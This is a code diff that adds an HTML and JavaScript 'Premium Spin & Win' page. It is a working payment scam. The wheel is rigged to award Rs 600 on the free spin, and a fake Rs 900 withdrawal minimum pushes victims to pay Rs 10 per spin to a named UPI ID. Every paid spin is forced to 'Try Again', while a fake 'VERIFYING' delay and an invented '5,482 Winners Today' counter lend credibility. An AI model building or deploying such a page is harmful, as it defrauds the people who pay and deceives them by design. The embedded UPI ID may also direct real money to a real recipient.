@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Premium Spin & Win 🎰</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --gold: #FFD700;
+      --gold-dark: #D4AF37;
+      --red: #FF3860;
+      --blue: #2196F3;
+      --bg-dark: #121212;
+    }
+    
+    body {
+      margin: 0;
+      font-family: 'Montserrat', sans-serif;
+      background: var(--bg-dark);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow-x: hidden;
+      background-image: 
+        radial-gradient(circle at 50% 50%, rgba(212, 175, 55, 0.05) 0%, transparent 30%),
+        linear-gradient(to bottom, #050505, #121212);
+      padding: 20px 0;
+    }
+    
+    .header {
+      text-align: center;
+      margin-bottom: 2rem;
+      position: relative;
+    }
+    
+    h1 {
+      font-size: 2.5rem;
+      color: var(--gold);
+      text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+      margin-bottom: 0.5rem;
+      letter-spacing: 1px;
+    }
+    
+    .subtitle {
+      color: rgba(255,255,255,0.7);
+      font-size: 1.1rem;
+    }
+    
+    .wheel-container {
+      position: relative;
+      margin: 1rem 0;
+    }
+    
+    canvas {
+      border: 8px solid var(--gold-dark);
+      border-radius: 50%;
+      background-color: #000;
+      box-shadow: 0 0 30px rgba(212, 175, 55, 0.3);
+      display: block;
+    }
+    
+    .wheel-pointer {
+      position: absolute;
+      top: -20px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 0;
+      height: 0;
+      border-left: 25px solid transparent;
+      border-right: 25px solid transparent;
+      border-top: 50px solid var(--gold);
+      z-index: 10;
+      filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.8));
+    }
+    
+    button {
+      margin-top: 2rem;
+      background: linear-gradient(to right, var(--gold), var(--gold-dark));
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.2rem;
+      font-weight: 700;
+      border-radius: 50px;
+      cursor: pointer;
+      color: black;
+      box-shadow: 0 5px 15px rgba(212, 175, 55, 0.4);
+      transition: all 0.3s;
+      text-transform: uppercase;
+    }
+    
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(212, 175, 55, 0.6);
+    }
+    
+    button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none !important;
+    }
+    
+    #prizeBox {
+      margin-top: 1.5rem;
+      font-size: 1.5rem;
+      color: var(--gold);
+      text-align: center;
+    }
+    
+    #total {
+      font-weight: 800;
+      font-size: 2rem;
+    }
+    
+    #upiBox {
+      margin-top: 2rem;
+      display: none;
+      background: rgba(30,30,30,0.9);
+      color: white;
+      border: 2px solid var(--gold);
+      padding: 1.5rem;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    }
+    
+    #upiBox b {
+      color: var(--gold);
+      font-size: 1.2rem;
+      display: inline-block;
+      margin: 10px 0;
+      background: rgba(0,0,0,0.3);
+      padding: 8px 15px;
+      border-radius: 6px;
+      font-family: 'Roboto Mono', monospace;
+    }
+    
+    .copy-btn {
+      background: var(--gold);
+      color: black;
+      border: none;
+      padding: 8px 15px;
+      border-radius: 6px;
+      font-weight: 600;
+      margin-top: 10px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    
+    .copy-btn:hover {
+      background: white;
+    }
+    
+    #paymentModal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.9);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .modal-content {
+      background: linear-gradient(145deg, #111, #1a1a1a);
+      border-radius: 16px;
+      padding: 2rem;
+      width: 90%;
+      max-width: 400px;
+      border: 1px solid var(--gold);
+      box-shadow: 0 10px 30px rgba(212, 175, 55, 0.2);
+      position: relative;
+      animation: fadeIn 0.3s;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .close-modal {
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      color: rgba(255,255,255,0.7);
+      font-size: 1.5rem;
+      cursor: pointer;
+    }
+    
+    .modal-title {
+      font-size: 1.5rem;
+      color: var(--gold);
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+    
+    .transaction-input {
+      margin-top: 1.5rem;
+    }
+    
+    .transaction-input input {
+      width: 100%;
+      padding: 1rem;
+      border-radius: 8px;
+      border: 1px solid var(--gold);
+      background: rgba(30,30,30,0.8);
+      color: white;
+      font-size: 1rem;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+    
+    .confirm-btn {
+      background: var(--gold);
+      color: black;
+      border: none;
+      padding: 1rem;
+      border-radius: 8px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      width: 100%;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    
+    .confirm-btn:hover {
+      background: white;
+    }
+    
+    #withdrawModal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.9);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    #withdrawModal.show {
+      display: flex;
+    }
+    
+    .win-counter {
+      background: rgba(255,215,0,0.1);
+      border: 1px solid var(--gold);
+      border-radius: 50px;
+      padding: 0.5rem 1.5rem;
+      margin-top: 1rem;
+      font-size: 0.9rem;
+    }
+    
+    .bottom-ref-input {
+      margin-top: 2rem;
+      background: rgba(30,30,30,0.9);
+      color: white;
+      border: 2px solid var(--gold);
+      padding: 1.5rem;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    }
+    
+    .bottom-ref-input input {
+      width: 100%;
+      padding: 1rem;
+      border-radius: 8px;
+      border: 1px solid var(--gold);
+      background: rgba(30,30,30,0.8);
+      color: white;
+      font-size: 1rem;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+    
+    @media(max-width: 600px) {
+      canvas {
+        width: 280px !important;
+        height: 280px !important;
+      }
+      
+      h1 {
+        font-size: 1.8rem;
+      }
+    }
+  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&family=Roboto+Mono&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="header">
+    <h1>PREMIUM SPIN & WIN</h1>
+    <div class="subtitle">Spin to win ₹600 or ₹50,000 instantly!</div>
+    <div class="win-counter">
+      <i class="fas fa-users"></i> 5,482 Winners Today
+    </div>
+  </div>
+  
+  <div class="wheel-container">
+    <canvas id="wheel" width="400" height="400"></canvas>
+    <div class="wheel-pointer"></div>
+  </div>
+  
+  <button id="spinBtn">SPIN FOR FREE</button>
+  
+  <div id="prizeBox">
+    Your winnings: <span id="total">0</span>
+  </div>
+  
+  <div id="upiBox">
+    <div>🔒 You've used your free spin</div>
+    <div>Pay ₹10 via UPI to spin again:</div>
+    <b id="upiId">keanjohn72@oksbi</b>
+    <button class="copy-btn" onclick="copyUpiId()">COPY UPI ID</button>
+    <div style="margin-top: 15px; font-size: 0.9rem;">
+      After payment, enter transaction ID below
+    </div>
+  </div>
+  
+  <!-- Payment Modal -->
+  <div id="paymentModal">
+    <div class="modal-content">
+      <span class="close-modal" id="closeModal">&times;</span>
+      <div class="modal-title">PAY ₹10 TO SPIN AGAIN</div>
+      <p>To continue playing, please make payment via UPI:</p>
+      
+      <div style="margin: 1.5rem 0; text-align: center;">
+        <div style="font-size: 1.2rem; color: var(--gold);">keanjohn72@oksbi</div>
+        <button class="copy-btn" onclick="copyUpiId()" style="margin-top: 10px;">COPY UPI ID</button>
+      </div>
+      
+      <div class="transaction-input">
+        <input type="text" id="transactionId" placeholder="Enter Transaction ID (12-19 digits)" maxlength="19">
+        <button class="confirm-btn" id="confirmPaymentBtn">CONFIRM PAYMENT</button>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Withdraw Modal -->
+  <div id="withdrawModal">
+    <div class="modal-content">
+      <div class="modal-title">WITHDRAWAL REQUIREMENT</div>
+      <p>Minimum withdrawal amount is <span style="color: var(--gold); font-weight: 700;">₹900</span></p>
+      <p style="margin-top: 1rem;">Spin again to increase your winnings!</p>
+      <button class="confirm-btn" style="margin-top: 1.5rem;" onclick="document.getElementById('withdrawModal').classList.remove('show'); document.getElementById('paymentModal').style.display = 'flex';">SPIN AGAIN</button>
+    </div>
+  </div>
+
+  <!-- Bottom Reference Input -->
+  <div class="bottom-ref-input">
+    <h3>Enter Reference ID to Spin</h3>
+    <input type="text" id="bottomRefId" placeholder="Enter 12-19 digit Reference ID" maxlength="19">
+    <button class="confirm-btn" id="bottomRefBtn">SUBMIT & SPIN</button>
+  </div>
+
+  <script>
+    const canvas = document.getElementById("wheel");
+    const ctx = canvas.getContext("2d");
+    const spinBtn = document.getElementById("spinBtn");
+    const upiBox = document.getElementById("upiBox");
+    const paymentModal = document.getElementById("paymentModal");
+    const closeModal = document.getElementById("closeModal");
+    const confirmPaymentBtn = document.getElementById("confirmPaymentBtn");
+    const transactionIdInput = document.getElementById("transactionId");
+    const bottomRefIdInput = document.getElementById("bottomRefId");
+    const bottomRefBtn = document.getElementById("bottomRefBtn");
+    
+    // Configure wheel segments
+    const segments = [
+      { label: "₹600", color: "#2196F3", value: 600 },
+      { label: "Try Again", color: "#555", value: 0 },
+      { label: "₹600", color: "#2196F3", value: 600 },
+      { label: "Try Again", color: "#555", value: 0 },
+      { label: "₹600", color: "#2196F3", value: 600 },
+      { label: "Try Again", color: "#555", value: 0 },
+      { label: "₹600", color: "#2196F3", value: 600 },
+      { label: "Try Again", color: "#555", value: 0 }
+    ];
+
+    const segAngle = 2 * Math.PI / segments.length;
+    let angle = 0;
+    let spinning = false;
+    let spinCount = 0;
+    let winnings = 0;
+    
+    function drawWheel() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      
+      // Draw segments
+      for (let i = 0; i < segments.length; i++) {
+        const start = angle + i * segAngle;
+        const end = start + segAngle;
+        
+        // Segment background
+        ctx.beginPath();
+        ctx.fillStyle = segments[i].color;
+        ctx.moveTo(200, 200);
+        ctx.arc(200, 200, 200, start, end);
+        ctx.fill();
+        
+        // Segment border
+        ctx.strokeStyle = "rgba(0,0,0,0.3)";
+        ctx.lineWidth = 2;
+        ctx.stroke();
+
+        // Text
+        ctx.save();
+        ctx.translate(200, 200);
+        ctx.rotate(start + segAngle / 2);
+        ctx.textAlign = "right";
+        ctx.fillStyle = "white";
+        ctx.font = "bold 22px Montserrat";
+        ctx.shadowColor = "black";
+        ctx.shadowBlur = 5;
+        ctx.fillText(segments[i].label, 180, 10);
+        ctx.restore();
+      }
+
+      // Draw center
+      ctx.beginPath();
+      ctx.fillStyle = "gold";
+      ctx.arc(200, 200, 30, 0, 2 * Math.PI);
+      ctx.fill();
+      
+      // Center border
+      ctx.strokeStyle = "rgba(0,0,0,0.5)";
+      ctx.lineWidth = 3;
+      ctx.stroke();
+    }
+
+    function spin() {
+      if (spinning) return;
+
+      // Check if payment is needed
+      if (spinCount >= 1) {
+        paymentModal.style.display = "flex";
+        return;
+      }
+
+      spinning = true;
+      spinBtn.disabled = true;
+      
+      let spinAngle;
+      if (spinCount === 0) {
+        // First spin - force ₹600
+        const index600 = segments.findIndex(s => s.value === 600);
+        const targetAngle = 1.5 * Math.PI - (index600 * segAngle + segAngle / 2);
+        spinAngle = 5 * 2 * Math.PI + targetAngle;
+      } else {
+        // Paid spins - force Try Again
+        const indexTryAgain = segments.findIndex(s => s.value === 0);
+        const targetAngle = 1.5 * Math.PI - (indexTryAgain * segAngle + segAngle / 2);
+        spinAngle = 5 * 2 * Math.PI + targetAngle;
+      }
+
+      let duration = 5000;
+      let start = null;
+
+      function animate(timestamp) {
+        if (!start) start = timestamp;
+        let progress = timestamp - start;
+        let ease = 1 - Math.pow(1 - progress / duration, 3);
+        angle = spinAngle * ease;
+        drawWheel();
+
+        if (progress < duration) {
+          requestAnimationFrame(animate);
+        } else {
+          spinning = false;
+          spinCount++;
+          
+          // Calculate landed segment
+          let landedIndex = Math.floor(((2 * Math.PI - angle % (2 * Math.PI)) % (2 * Math.PI)) / segAngle);
+          let landed = segments[landedIndex];
+          
+          if (spinCount === 1) {
+            // First spin - add winnings
+            winnings += landed.value;
+            document.getElementById("total").textContent = winnings;
+            spinBtn.textContent = "SPIN AGAIN (₹10)";
+            upiBox.style.display = "block";
+            
+            if (winnings >= 900) {
+              setTimeout(() => {
+                alert(`🎉 Congratulations! You won ₹${landed.value}. You can now withdraw your winnings!`);
+              }, 500);
+            } else {
+              setTimeout(() => {
+                document.getElementById("withdrawModal").classList.add("show");
+              }, 500);
+            }
+          } else {
+            // Paid spin - show Try Again message
+            setTimeout(() => {
+              alert("Try again next time!");
+              spinBtn.textContent = "SPIN AGAIN (₹10)";
+              spinBtn.disabled = false;
+            }, 500);
+          }
+        }
+      }
+
+      requestAnimationFrame(animate);
+    }
+
+    function autoSpinAfterPayment() {
+      if (spinning) return;
+      
+      spinning = true;
+      spinBtn.disabled = true;
+      
+      // Force Try Again on paid spins
+      const indexTryAgain = segments.findIndex(s => s.value === 0);
+      const targetAngle = 1.5 * Math.PI - (indexTryAgain * segAngle + segAngle / 2);
+      const spinAngle = 5 * 2 * Math.PI + targetAngle;
+
+      let duration = 5000;
+      let start = null;
+
+      function animate(timestamp) {
+        if (!start) start = timestamp;
+        let progress = timestamp - start;
+        let ease = 1 - Math.pow(1 - progress / duration, 3);
+        angle = spinAngle * ease;
+        drawWheel();
+
+        if (progress < duration) {
+          requestAnimationFrame(animate);
+        } else {
+          spinning = false;
+          spinCount++;
+          
+          setTimeout(() => {
+            alert("Try again next time!");
+            spinBtn.textContent = "SPIN AGAIN (₹10)";
+            spinBtn.disabled = false;
+          }, 500);
+        }
+      }
+
+      requestAnimationFrame(animate);
+    }
+
+    // Payment system
+    closeModal.addEventListener("click", () => {
+      paymentModal.style.display = "none";
+    });
+
+    confirmPaymentBtn.addEventListener("click", () => {
+      const transactionId = transactionIdInput.value.trim();
+      
+      if (!transactionId || transactionId.length < 12 || transactionId.length > 19) {
+        alert("Please enter a valid 12-19 digit Transaction ID");
+        return;
+      }
+      
+      confirmPaymentBtn.disabled = true;
+      confirmPaymentBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING...';
+      
+      setTimeout(() => {
+        // Reset for next spin
+        paymentModal.style.display = "none";
+        transactionIdInput.value = "";
+        confirmPaymentBtn.innerHTML = "CONFIRM PAYMENT";
+        confirmPaymentBtn.disabled = false;
+        
+        // Auto spin after payment
+        autoSpinAfterPayment();
+      }, 2000);
+    });
+
+    // Bottom reference input
+    bottomRefBtn.addEventListener("click", () => {
+      const refId = bottomRefIdInput.value.trim();
+      
+      if (!refId || refId.length < 12 || refId.length > 19) {
+        alert("Please enter a valid 12-19 digit Reference ID");
+        return;
+      }
+      
+      bottomRefBtn.disabled = true;
+      bottomRefBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
+      
+      setTimeout(() => {
+        bottomRefIdInput.value = "";
+        bottomRefBtn.innerHTML = "SUBMIT & SPIN";
+        bottomRefBtn.disabled = false;
+        
+        // Auto spin after reference ID submission
+        autoSpinAfterPayment();
+      }, 2000);
+    });
+
+    // Copy UPI ID
+    function copyUpiId() {
+      const upiId = "keanjohn72@oksbi";
+      navigator.clipboard.writeText(upiId).then(() => {
+        const copyBtn = document.querySelector(".copy-btn");
+        copyBtn.textContent = "COPIED!";
+        setTimeout(() => {
+          copyBtn.textContent = "COPY UPI ID";
+        }, 2000);
+      });
+    }
+
+    // Initialize
+    spinBtn.addEventListener("click", spin);
+    drawWheel();
+  </script>
+</body>
+</html>
